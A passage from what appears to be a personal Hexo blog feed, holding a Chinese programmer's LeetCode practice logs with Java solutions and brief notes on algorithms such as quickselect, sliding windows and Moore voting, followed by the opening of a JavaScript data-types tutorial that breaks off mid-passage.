class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">lengthOfLongestSubstring</span><span class="hljs-params">(String s)</span> </span>&#123;        HashMap&lt;Character,Integer&gt; map = <span class="hljs-keyword">new</span> HashMap();        <span class="hljs-keyword">int</span> tmp=<span class="hljs-number">0</span>, res=<span class="hljs-number">0</span>;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;s.length();i++) &#123;            <span class="hljs-keyword">int</span> j = map.getOrDefault(s.charAt(i), -<span class="hljs-number">1</span>);            map.put(s.charAt(i),i);            tmp = tmp&lt;i-j?tmp+<span class="hljs-number">1</span>:i-j;            res = Math.max(res,tmp);        &#125;        <span class="hljs-keyword">return</span> res;    &#125;&#125;</code></pre></div><h3 id="最长有效括号"><a href="#最长有效括号" class="headerlink" title="最长有效括号"></a><a href="https://leetcode-cn.com/problems/longest-valid-parentheses/" target="_blank" rel="noopener">最长有效括号</a></h3><p>东子哥说的动规没想出来，用栈也做错了。。。</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">longestValidParentheses</span><span class="hljs-params">(String s)</span> </span>&#123;        Deque&lt;Integer&gt; stack = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();        <span class="hljs-keyword">int</span> max = <span class="hljs-number">0</span>;        stack.push(-<span class="hljs-number">1</span>);        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;s.length();i++) &#123;            <span class="hljs-keyword">if</span>(s.charAt(i) == <span class="hljs-string">'('</span>) stack.push(i);            <span class="hljs-keyword">else</span> &#123;                stack.pop();                <span class="hljs-keyword">if</span>(stack.isEmpty()) stack.push(i);                <span class="hljs-keyword">else</span> max = Math.max(max,i-stack.peek());            &#125;        &#125;        <span class="hljs-keyword">return</span> max;    &#125;&#125;</code></pre></div><h3 id="丑数"><a href="#丑数" class="headerlink" title="丑数"></a><a href="https://leetcode-cn.com/problems/chou-shu-lcof/" target="_blank" rel="noopener">丑数</a></h3><p>想象因数分解</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">nthUglyNumber</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span> </span>&#123;        <span class="hljs-keyword">int</span> a = <span class="hljs-number">0</span>, b = <span class="hljs-number">0</span>, c = <span class="hljs-number">0</span>;        <span class="hljs-keyword">int</span>[] dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n];        dp[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; n; i++) &#123;            <span class="hljs-keyword">int</span> n2 = dp[a] * <span class="hljs-number">2</span>, n3 = dp[b] * <span class="hljs-number">3</span>, n5 = dp[c] * <span class="hljs-number">5</span>;            dp[i] = Math.min(Math.min(n2, n3), n5);            <span class="hljs-keyword">if</span>(dp[i] == n2) a++;            <span class="hljs-keyword">if</span>(dp[i] == n3) b++;            <span class="hljs-keyword">if</span>(dp[i] == n5) c++;        &#125;        <span class="hljs-keyword">return</span> dp[n - <span class="hljs-number">1</span>];    &#125;&#125;</code></pre></div><h3 id="通配符匹配"><a href="#通配符匹配" class="headerlink" title="通配符匹配"></a><a href="https://leetcode-cn.com/problems/wildcard-matching/" target="_blank" rel="noopener">通配符匹配</a></h3><p>和之前的正则表达式匹配几乎一模一样</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isMatch</span><span class="hljs-params">(String s, String p)</span> </span>&#123;        <span class="hljs-keyword">int</span> n=s.length(), m=p.length();        <span class="hljs-keyword">boolean</span>[][] f = <span class="hljs-keyword">new</span> <span class="hljs-keyword">boolean</span>[n+<span class="hljs-number">1</span>][m+<span class="hljs-number">1</span>];        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;=n;i++) &#123;            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">0</span>;j&lt;=m;j++) &#123;                <span class="hljs-keyword">if</span>(j == <span class="hljs-number">0</span>) f[i][j] = i==<span class="hljs-number">0</span>;                <span class="hljs-keyword">else</span> &#123;                    <span class="hljs-keyword">if</span>(p.charAt(j-<span class="hljs-number">1</span>) != <span class="hljs-string">'*'</span>) &#123;                        <span class="hljs-keyword">if</span>(i&gt;<span class="hljs-number">0</span> &amp;&amp; (p.charAt(j-<span class="hljs-number">1</span>)==s.charAt(i-<span class="hljs-number">1</span>) || p.charAt(j-<span class="hljs-number">1</span>)==<span class="hljs-string">'?'</span>))                            f[i][j] = f[i-<span class="hljs-number">1</span>][j-<span class="hljs-number">1</span>];                    &#125;                    <span class="hljs-keyword">else</span> &#123;                        <span class="hljs-keyword">if</span>(j &gt;= <span class="hljs-number">1</span>) f[i][j] = f[i][j-<span class="hljs-number">1</span>];                        <span class="hljs-keyword">if</span>(i &gt;= <span class="hljs-number">1</span>) f[i][j] |= f[i-<span class="hljs-number">1</span>][j];                    &#125;                &#125;            &#125;        &#125;        <span class="hljs-keyword">return</span> f[n][m];    &#125;&#125;</code></pre></div>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;7-1至7-5做题记录&quot;&gt;&lt;a href=&quot;#7-1至7-5做题记录&quot; class=&quot;headerlink&quot; title=&quot;7.1至7.5做题记录&quot;&gt;&lt;/a&gt;7.1至7.5做题记录&lt;/h1&gt;&lt;h3 id=&quot;最长重复子数组&quot;&gt;&lt;a href=&quot;#最长重复子数组&quot; c</summary>
      
    
    
    
    <category term="Algorithm" scheme="http://yoursite.com/categories/Algorithm/"/>
    
    
    <category term="leetcode" scheme="http://yoursite.com/tags/leetcode/"/>
    
    <category term="每日一题" scheme="http://yoursite.com/tags/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"/>
    
    <category term="剑指offer" scheme="http://yoursite.com/tags/%E5%89%91%E6%8C%87offer/"/>
    
  </entry>
  
  <entry>
    <title>6.25至6.30做题记录</title>
    <link href="http://yoursite.com/2020/06/30/6.25%E8%87%B36.30%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://yoursite.com/2020/06/30/6.25%E8%87%B36.30%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2020-06-30T12:26:40.000Z</published>
    <updated>2020-07-02T03:54:56.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="6-25至6-30做题记录"><a href="#6-25至6-30做题记录" class="headerlink" title="6.25至6.30做题记录"></a>6.25至6.30做题记录</h1><h3 id="数组中的第K个最大元素"><a href="#数组中的第K个最大元素" class="headerlink" title="数组中的第K个最大元素"></a><a href="https://leetcode-cn.com/problems/kth-largest-element-in-an-array/" target="_blank" rel="noopener">数组中的第K个最大元素</a></h3><p>未排序的数组中找元素，不需要把整个数组实现排序，又快排找位置的思想最快，堆排序也可以</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    Random random = <span class="hljs-keyword">new</span> Random();    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">findKthLargest</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> k)</span> </span>&#123;        <span class="hljs-keyword">return</span> quicksort(nums, <span class="hljs-number">0</span>, nums.length-<span class="hljs-number">1</span>, nums.length-k);        &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">quicksort</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] a, <span class="hljs-keyword">int</span> l, <span class="hljs-keyword">int</span> r, <span class="hljs-keyword">int</span> index)</span> </span>&#123;        <span class="hljs-keyword">int</span> q = randompartition(a,l,r);        <span class="hljs-keyword">if</span>(q == index) <span class="hljs-keyword">return</span> a[q];        <span class="hljs-keyword">return</span> q&gt;index?quicksort(a,l,q-<span class="hljs-number">1</span>,index):quicksort(a,q+<span class="hljs-number">1</span>,r,index);    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">randompartition</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] a, <span class="hljs-keyword">int</span> l, <span class="hljs-keyword">int</span> r)</span> </span>&#123;        <span class="hljs-keyword">int</span> i=random.nextInt(r-l+<span class="hljs-number">1</span>)+l;        swap(a,i,r);        <span class="hljs-keyword">return</span> partition(a,l,r);    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">partition</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] a, <span class="hljs-keyword">int</span> l, <span class="hljs-keyword">int</span> r)</span> </span>&#123;        <span class="hljs-keyword">int</span> i=l-<span class="hljs-number">1</span>;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=l;j&lt;r;j++) &#123;            <span class="hljs-keyword">if</span>(a[j] &lt;= a[r])                swap(a,j,++i);        &#125;        swap(a,i+<span class="hljs-number">1</span>,r);        <span class="hljs-keyword">return</span> i+<span class="hljs-number">1</span>;    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] a, <span class="hljs-keyword">int</span> i, <span class="hljs-keyword">int</span> j)</span> </span>&#123;        <span class="hljs-keyword">int</span> tmp=a[i];        a[i]=a[j];        a[j]=tmp;    &#125;&#125;</code></pre></div><h3 id="最小的K个数"><a href="#最小的K个数" class="headerlink" title="最小的K个数"></a><a href="https://leetcode-cn.com/problems/zui-xiao-de-kge-shu-lcof/" target="_blank" rel="noopener">最小的K个数</a></h3><p>这一题和上一题几乎一样，注意找前 K 大/前 K 小问题不需要对整个数组进行 O(NlogN) 的排序，用快排就可以解决topK问题</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    Random random = <span class="hljs-keyword">new</span> Random();    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[] getLeastNumbers(<span class="hljs-keyword">int</span>[] arr, <span class="hljs-keyword">int</span> k) &#123;        <span class="hljs-keyword">if</span>(arr.length==<span class="hljs-number">0</span> || k==<span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">0</span>];        <span class="hljs-keyword">return</span> quicksort(arr,<span class="hljs-number">0</span>,arr.length-<span class="hljs-number">1</span>,k-<span class="hljs-number">1</span>);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[] quicksort(<span class="hljs-keyword">int</span>[] arr, <span class="hljs-keyword">int</span> l, <span class="hljs-keyword">int</span> r, <span class="hljs-keyword">int</span> index) &#123;        <span class="hljs-keyword">int</span> q = randompartition(arr,l,r);        <span class="hljs-keyword">if</span>(q==index) <span class="hljs-keyword">return</span> Arrays.copyOf(arr, q + <span class="hljs-number">1</span>);        <span class="hljs-keyword">return</span> q&gt;index?quicksort(arr,l,q-<span class="hljs-number">1</span>,index):quicksort(arr,q+<span class="hljs-number">1</span>,r,index);    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">randompartition</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] arr, <span class="hljs-keyword">int</span> l, <span class="hljs-keyword">int</span> r)</span> </span>&#123;        <span class="hljs-keyword">int</span> i=random.nextInt(r-l+<span class="hljs-number">1</span>)+l;        swap(arr,i,r);        <span class="hljs-keyword">return</span> partition(arr,l,r);    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">partition</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] arr, <span class="hljs-keyword">int</span> l, <span class="hljs-keyword">int</span> r)</span> </span>&#123;        <span class="hljs-keyword">int</span> i=l-<span class="hljs-number">1</span>;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=l;j&lt;r;j++) &#123;            <span class="hljs-keyword">if</span>(arr[j] &lt; arr[r])                swap(arr,j,++i);        &#125;        swap(arr,i+<span class="hljs-number">1</span>,r);        <span class="hljs-keyword">return</span> i+<span class="hljs-number">1</span>;    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] arr, <span class="hljs-keyword">int</span> i, <span class="hljs-keyword">int</span> j)</span> </span>&#123;        <span class="hljs-keyword">int</span> tmp=arr[i];        arr[i]=arr[j];        arr[j]=tmp;    &#125;&#125;</code></pre></div><h3 id="长度最小的子数组"><a href="#长度最小的子数组" class="headerlink" title="长度最小的子数组"></a><a href="https://leetcode-cn.com/problems/minimum-size-subarray-sum/" target="_blank" rel="noopener">长度最小的子数组</a></h3><p>一开始是用队列做的，其实不需要这么麻烦，用双指针可以节省空间</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">minSubArrayLen</span><span class="hljs-params">(<span class="hljs-keyword">int</span> s, <span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;        <span class="hljs-keyword">int</span> n = nums.length;        <span class="hljs-keyword">if</span> (n == <span class="hljs-number">0</span>) &#123;            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;        &#125;        <span class="hljs-keyword">int</span> ans = Integer.MAX_VALUE;        <span class="hljs-keyword">int</span> start = <span class="hljs-number">0</span>, end = <span class="hljs-number">0</span>;        <span class="hljs-keyword">int</span> sum = <span class="hljs-number">0</span>;        <span class="hljs-keyword">while</span> (end &lt; n) &#123;            sum += nums[end];            <span class="hljs-keyword">while</span> (sum &gt;= s) &#123;                ans = Math.min(ans, end - start + <span class="hljs-number">1</span>);                sum -= nums[start];                start++;            &#125;            end++;        &#125;        <span class="hljs-keyword">return</span> ans == Integer.MAX_VALUE ? <span class="hljs-number">0</span> : ans;    &#125;&#125;</code></pre></div><h3 id="数据流中的中位数"><a href="#数据流中的中位数" class="headerlink" title="数据流中的中位数"></a><a href="https://leetcode-cn.com/problems/shu-ju-liu-zhong-de-zhong-wei-shu-lcof/" target="_blank" rel="noopener">数据流中的中位数</a></h3><p>自己用链表实现的，每次插入时插到合适的位置，找中位数时遍历去找，看了大佬的代码发现其实用堆做是最优解</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MedianFinder</span> </span>&#123;    <span class="hljs-keyword">int</span> len = <span class="hljs-number">0</span>;    <span class="hljs-keyword">boolean</span> odd = <span class="hljs-keyword">false</span>;    <span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">node</span></span>&#123;        <span class="hljs-keyword">int</span> val;        node next;        node(<span class="hljs-keyword">int</span> x) &#123; val = x; &#125;    &#125;    node head;    <span class="hljs-comment">/** initialize your data structure here. */</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">MedianFinder</span><span class="hljs-params">()</span> </span>&#123;        head=<span class="hljs-keyword">null</span>;    &#125;        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">addNum</span><span class="hljs-params">(<span class="hljs-keyword">int</span> num)</span> </span>&#123;        len++;        odd=!odd;        node n = <span class="hljs-keyword">new</span> node(num);        n.next=<span class="hljs-keyword">null</span>;        <span class="hljs-keyword">if</span>(head==<span class="hljs-keyword">null</span>) head = n;        <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">if</span>(num&lt;head.val) &#123;                n.next=head;                head=n;                <span class="hljs-keyword">return</span> ;            &#125;            node cur=head;            <span class="hljs-keyword">while</span>(cur.next!=<span class="hljs-keyword">null</span> &amp;&amp; cur.next.val&lt;num) cur=cur.next;            n.next=cur.next;            cur.next=n;        &#125;    &#125;        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">double</span> <span class="hljs-title">findMedian</span><span class="hljs-params">()</span> </span>&#123;        <span class="hljs-keyword">if</span>(odd) &#123;            node cur=head;            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;len/<span class="hljs-number">2</span>+<span class="hljs-number">1</span>;i++) cur=cur.next;            <span class="hljs-keyword">return</span> cur.val;        &#125;        <span class="hljs-keyword">else</span> &#123;            node cur=head;            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;len/<span class="hljs-number">2</span>;i++) cur=cur.next;            <span class="hljs-keyword">return</span> (<span class="hljs-keyword">double</span>)(cur.val+cur.next.val)/<span class="hljs-number">2</span>;        &#125;    &#125;&#125;<span class="hljs-comment">/**</span><span class="hljs-comment"> * Your MedianFinder object will be instantiated and called as such:</span><span class="hljs-comment"> * MedianFinder obj = new MedianFinder();</span><span class="hljs-comment"> * obj.addNum(num);</span><span class="hljs-comment"> * double param_2 = obj.findMedian();</span><span class="hljs-comment"> */</span><span class="hljs-comment">// class MedianFinder &#123;</span><span class="hljs-comment">//     Queue&lt;Integer&gt; A, B;</span><span class="hljs-comment">//     public MedianFinder() &#123;</span><span class="hljs-comment">//         A = new PriorityQueue&lt;&gt;(); // 小顶堆，保存较大的一半</span><span class="hljs-comment">//         B = new PriorityQueue&lt;&gt;((x, y) -&gt; (y - x)); // 大顶堆，保存较小的一半</span><span class="hljs-comment">//     &#125;</span><span class="hljs-comment">//     public void addNum(int num) &#123;</span><span class="hljs-comment">//         if(A.size() != B.size()) &#123;</span><span class="hljs-comment">//             A.add(num);</span><span class="hljs-comment">//             B.add(A.poll());</span><span class="hljs-comment">//         &#125; else &#123;</span><span class="hljs-comment">//             B.add(num);</span><span class="hljs-comment">//             A.add(B.poll());</span><span class="hljs-comment">//         &#125;</span><span class="hljs-comment">//     &#125;</span><span class="hljs-comment">//     public double findMedian() &#123;</span><span class="hljs-comment">//         return A.size() != B.size() ? A.peek() : (A.peek() + B.peek()) / 2.0;</span><span class="hljs-comment">//     &#125;</span><span class="hljs-comment">// &#125;</span></code></pre></div><h3 id="连续子数组的最大和"><a href="#连续子数组的最大和" class="headerlink" title="连续子数组的最大和"></a><a href="https://leetcode-cn.com/problems/lian-xu-zi-shu-zu-de-zui-da-he-lcof/" target="_blank" rel="noopener">连续子数组的最大和</a></h3><p>O(n)解决</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">maxSubArray</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;        <span class="hljs-keyword">int</span> max=nums[<span class="hljs-number">0</span>];        <span class="hljs-keyword">int</span> pre=nums[<span class="hljs-number">0</span>], cur=<span class="hljs-number">0</span>;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;nums.length;i++) &#123;            cur=nums[i]&gt;nums[i]+pre?nums[i]:nums[i]+pre;            max=Math.max(cur,max);            pre=cur;        &#125;        <span class="hljs-keyword">return</span> max;    &#125;&#125;</code></pre></div><h3 id="除自身以外数组的乘积"><a href="#除自身以外数组的乘积" class="headerlink" title="除自身以外数组的乘积"></a><a href="https://leetcode-cn.com/problems/product-of-array-except-self/" target="_blank" rel="noopener">除自身以外数组的乘积</a></h3><p>这题是真蒙的，居然和题解一样。。。</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[] productExceptSelf(<span class="hljs-keyword">int</span>[] nums) &#123;        <span class="hljs-keyword">int</span>[] res = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[nums.length];        res[<span class="hljs-number">0</span>]=<span class="hljs-number">1</span>;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;nums.length;i++)            res[i] = res[i-<span class="hljs-number">1</span>] * nums[i-<span class="hljs-number">1</span>];        <span class="hljs-keyword">int</span> r=<span class="hljs-number">1</span>;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=nums.length-<span class="hljs-number">1</span>;i&gt;=<span class="hljs-number">0</span>;i--) &#123;            res[i] = res[i]*r;            r=r*nums[i];        &#125;        <span class="hljs-keyword">return</span> res;    &#125;&#125;</code></pre></div><h3 id="字符串的排列"><a href="#字符串的排列" class="headerlink" title="字符串的排列"></a><a href="https://leetcode-cn.com/problems/zi-fu-chuan-de-pai-lie-lcof/" target="_blank" rel="noopener">字符串的排列</a></h3><p>和之前K神写的一个状态转换的题很像，都是一样的递归，一样的剪枝。</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    List&lt;String&gt; res = <span class="hljs-keyword">new</span> ArrayList();    <span class="hljs-keyword">char</span>[] c;    <span class="hljs-keyword">public</span> String[] permutation(String s) &#123;        c=s.toCharArray();        dfs(<span class="hljs-number">0</span>);        <span class="hljs-keyword">return</span> res.toArray(<span class="hljs-keyword">new</span> String[res.size()]);    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;        <span class="hljs-keyword">if</span>(x == c.length - <span class="hljs-number">1</span>) &#123;            res.add(String.valueOf(c)); <span class="hljs-comment">// 添加排列方案</span>            <span class="hljs-keyword">return</span>;        &#125;        HashSet&lt;Character&gt; set = <span class="hljs-keyword">new</span> HashSet();        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=x;i&lt;c.length;i++) &#123;            <span class="hljs-keyword">if</span>(set.contains(c[i])) <span class="hljs-keyword">continue</span>;            set.add(c[i]);            swap(i,x);            dfs(x+<span class="hljs-number">1</span>);            swap(i,x);        &#125;    &#125;    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span> </span>&#123;        <span class="hljs-keyword">char</span> tmp = c[a];        c[a] = c[b];        c[b] = tmp;    &#125;&#125;</code></pre></div><h3 id="缺失的第一个正数"><a href="#缺失的第一个正数" class="headerlink" title="缺失的第一个正数"></a><a href="https://leetcode-cn.com/problems/first-missing-positive/" target="_blank" rel="noopener">缺失的第一个正数</a></h3><p>题目要求时间复杂度O(n)，并且使用常数级别空间，这种要求很刁钻的题目，就要让原有的nums数组承担比原本负责记录数据更多的内容，也就是它的下标也要赋予含义，用来记录某种状态</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">firstMissingPositive</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;        <span class="hljs-keyword">int</span> len = nums.length;        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;            <span class="hljs-keyword">while</span> (nums[i] &gt; <span class="hljs-number">0</span> &amp;&amp; nums[i] &lt;= len &amp;&amp; nums[nums[i] - <span class="hljs-number">1</span>] != nums[i]) &#123;                <span class="hljs-comment">// 满足在指定范围内、并且没有放在正确的位置上，才交换</span>                <span class="hljs-comment">// 例如：数值 3 应该放在索引 2 的位置上</span>                swap(nums, nums[i] - <span class="hljs-number">1</span>, i);            &#125;        &#125;        <span class="hljs-comment">// [1, -1, 3, 4]</span>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;            <span class="hljs-keyword">if</span> (nums[i] != i + <span class="hljs-number">1</span>) &#123;                <span class="hljs-keyword">return</span> i + <span class="hljs-number">1</span>;            &#125;        &#125;        <span class="hljs-comment">// 都正确则返回数组长度 + 1</span>        <span class="hljs-keyword">return</span> len + <span class="hljs-number">1</span>;    &#125;    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> index1, <span class="hljs-keyword">int</span> index2)</span> </span>&#123;        <span class="hljs-keyword">int</span> temp = nums[index1];        nums[index1] = nums[index2];        nums[index2] = temp;    &#125;&#125;</code></pre></div><h3 id="数组中出现次数超过一半的数字"><a href="#数组中出现次数超过一半的数字" class="headerlink" title="数组中出现次数超过一半的数字"></a><a href="https://leetcode-cn.com/problems/shu-zu-zhong-chu-xian-ci-shu-chao-guo-yi-ban-de-shu-zi-lcof/" target="_blank" rel="noopener">数组中出现次数超过一半的数字</a></h3><p><strong>摩尔投票法：</strong> 核心理念为 <strong>“正负抵消”</strong> ；时间和空间复杂度分别为 O(N)和 O(1)；</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">majorityElement</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;        <span class="hljs-keyword">int</span> votes=<span class="hljs-number">0</span>,x=<span class="hljs-number">0</span>;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> num: nums) &#123;            <span class="hljs-keyword">if</span>(votes==<span class="hljs-number">0</span>) x=num;            votes += x==num?<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>;        &#125;        <span class="hljs-keyword">return</span> x;    &#125;&#125;</code></pre></div>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;6-25至6-30做题记录&quot;&gt;&lt;a href=&quot;#6-25至6-30做题记录&quot; class=&quot;headerlink&quot; title=&quot;6.25至6.30做题记录&quot;&gt;&lt;/a&gt;6.25至6.30做题记录&lt;/h1&gt;&lt;h3 id=&quot;数组中的第K个最大元素&quot;&gt;&lt;a href=</summary>
      
    
    
    
    <category term="Algorithm" scheme="http://yoursite.com/categories/Algorithm/"/>
    
    
    <category term="leetcode" scheme="http://yoursite.com/tags/leetcode/"/>
    
    <category term="每日一题" scheme="http://yoursite.com/tags/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"/>
    
    <category term="剑指offer" scheme="http://yoursite.com/tags/%E5%89%91%E6%8C%87offer/"/>
    
  </entry>
  
  <entry>
    <title>JS中的变量类型与强制转换</title>
    <link href="http://yoursite.com/2020/06/30/JS%E4%B8%AD%E7%9A%84%E5%8F%98%E9%87%8F%E7%B1%BB%E5%9E%8B%E4%B8%8E%E5%BC%BA%E5%88%B6%E8%BD%AC%E6%8D%A2/"/>
    <id>http://yoursite.com/2020/06/30/JS%E4%B8%AD%E7%9A%84%E5%8F%98%E9%87%8F%E7%B1%BB%E5%9E%8B%E4%B8%8E%E5%BC%BA%E5%88%B6%E8%BD%AC%E6%8D%A2/</id>
    <published>2020-06-30T12:18:08.000Z</published>
    <updated>2020-06-30T14:03:58.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JS中的变量类型与强制转换"><a href="#JS中的变量类型与强制转换" class="headerlink" title="JS中的变量类型与强制转换"></a>JS中的变量类型与强制转换</h1><p>JS中一共有六种数据类型：</p><p>String 字符串    Number 数值    Boolean 布尔值    Null 空值    Undefined 未定义    Object 对象</p><p>其中，前五个都属于基本数据类型，而Object属于引用数据类型。</p><h3 id="String类型"><a href="#String类型" class="headerlink" title="String类型"></a>String类型</h3><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> a = <span class="hljs-string">"abc"</span>;<span class="hljs-built_in">console</span>.log(<span class="hljs-keyword">typeof</span> a);  <span class="hljs-comment">//string</span>a = <span class="hljs-string">"这是一个双引号 \""</span>;<span class="hljs-built_in">console</span>.log(a);a = <span class="hljs-string">"这是一个换行符 \n"</span>;<span class="hljs-built_in">console</span>.log(a);a = <span class="hljs-string">"这是一个制表符 \t"</span>;<span class="hljs-built_in">console</span>.log(a);</code></pre></div><h3 id="Number类型"><a href="#Number类型" class="headerlink" title="Number类型"></a>Number类型</h3><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> a = <span class="hljs-number">123</span>;<span class="hljs-built_in">console</span>.log(<span class="hljs-keyword">typeof</span> a);  <span class="hljs-comment">//number</span>a = <span 